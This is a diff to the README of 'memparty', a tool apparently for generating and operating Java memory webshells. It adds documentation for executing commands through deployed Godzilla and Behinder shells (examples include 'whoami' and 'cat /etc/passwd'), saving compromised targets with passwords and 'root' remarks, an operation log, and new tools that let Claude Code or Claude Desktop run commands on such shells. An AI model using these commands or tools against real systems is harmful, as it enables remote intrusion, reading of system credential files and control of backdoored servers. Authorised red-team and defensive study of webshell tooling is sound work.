@@ -18,6 +18,12 @@ same HTTP API that powers `party.mem.mk/ui`.
 - **All endpoints** — memshell generate, probe generate, config listing, class-name parsing, version.
 - **Connection testing** — `memparty connect` verifies a deployed Godzilla / Behinder / suo5 shell
   is alive and the credentials work (echo/handshake round-trip).
+- **Command execution** — `memparty exec` runs a command on a deployed Godzilla / Behinder shell
+  and prints its output (real `execCommand` / `Cmd` payload round-trip).
+- **Named targets** — `memparty target save` stores shells in projects (with remark + category),
+  then `memparty exec web1/bh9060 --cmd "whoami"` needs no flags at all.
+- **Operation log** — every gen/probe/connect/exec/target operation is appended to
+  `~/.memparty/operations.jsonl`; `memparty log` queries it by category and target.
 - **Flexible output** — payload to stdout by default, or `-o file` (auto base64-decodes `.class`/`.jar`).
 - **Any backend** — defaults to the public site, override to your self-hosted instance.
 
@@ -134,6 +140,67 @@ memparty connect -u http://target/x -t godzilla --pass pass --key key \
 Other flags: `-H "Name: value"` for extra headers, `-k/--insecure` for self-signed TLS,
 `--json` for machine-readable output, `--timeout <ms>` (global option).
 
+### Executing commands on a deployed shell
+
+`memparty exec` runs a command line through a deployed Godzilla / Behinder shell and prints the
+remote stdout+stderr. It uses the tool's real protocol — Godzilla's `execCommand` payload method
+(argv passed as `arg-0..N`, wrapped in `cmd.exe /c` or `/bin/sh -c`) and Behinder's `Cmd` payload
+class (which picks the shell itself based on the remote `os.name`).
+
+```bash
+# Godzilla — auto-detects the remote OS via getBasicsInfo (one extra request);
+# pass --os windows|linux to skip the detection
+memparty exec -u http://target/shell.jsp -t godzilla --pass pass --key key --cmd "whoami"
+
+# Behinder — the payload detects the OS itself, no extra request
+memparty exec -u http://target/shell.jsp -t behinder --pass rebeyond --cmd "cat /etc/passwd"
+```
+
+The gate-header flags are the same as for `connect`; `--json` returns
+`{ ok, tool, url, command, output, durationMs }` for automation.
+
+### Saved targets (projects)
+
+Save a shell once, then reference it by name — no more flag soup. Shells live inside
+**projects**: a project groups several shells of one engagement and carries an optional
+`--remark` and `--category`. The store is `~/.memparty/targets.json`.
+
+```bash
+# save (project is created on the fly; --remark/--category are project-level,
+# --shell-remark describes this one shell)
+memparty target save web1/bh9060 -u http://192.0.2.10:9060/console/service \
+  -t behinder --pass rebeyond --header-name User-Agent --header-value my-secret-token \
+  --remark "内网测试环境 WebSphere" --category test --shell-remark "root 权限"
+
+# list everything (filter with --category <name>)
+memparty target list
+
+# use: <project>/<shell>, or a bare project name when it holds exactly one shell
+memparty connect web1/bh9060
+memparty exec web1 --cmd "whoami"
+
+# edit project meta or a shell's remark / clean up
+memparty target note web1 --remark "new remark" --category prod
+memparty target note web1/bh9060 --remark "new shell note"
+memparty target remove web1/bh9060   # one shell
+memparty target remove web1          # the whole project
+```
+
+Explicit flags still override stored values (`memparty exec web1 --cmd id --pass otherpass`).
+
+### Operation log
+
+Every operation (gen, probe, connect, exec, target save/note/remove) is appended as one JSON
+line to `~/.memparty/operations.jsonl` — target, outcome, duration, and for exec the command
+plus truncated output. Credentials and payload bytes are never logged.
+
+```bash
+memparty log                          # latest 50 operations, newest first
+memparty log --category exec          # only command executions
+memparty log --target web1           # everything against one project (or a host substring)
+memparty log --category connect --json
+```
+
 ## Demos
 
 End-to-end recipes. Pick the **packer** to match your delivery vector, and the **shell type** to
@@ -246,7 +313,8 @@ Example Claude Code / Claude Desktop config:
 ```
 
 Exposed tools: `list_servers`, `list_config`, `list_packers`, `list_command_configs`,
-`generate_memshell`, `generate_probe`, `parse_classname`, `server_version`, `connect_test`.
+`generate_memshell`, `generate_probe`, `parse_classname`, `server_version`, `connect_test`,
+`exec_command`, `target_save`, `target_note`, `target_list`, `target_remove`, `log_list`.
 
 ## AI skill (Claude Code)
 
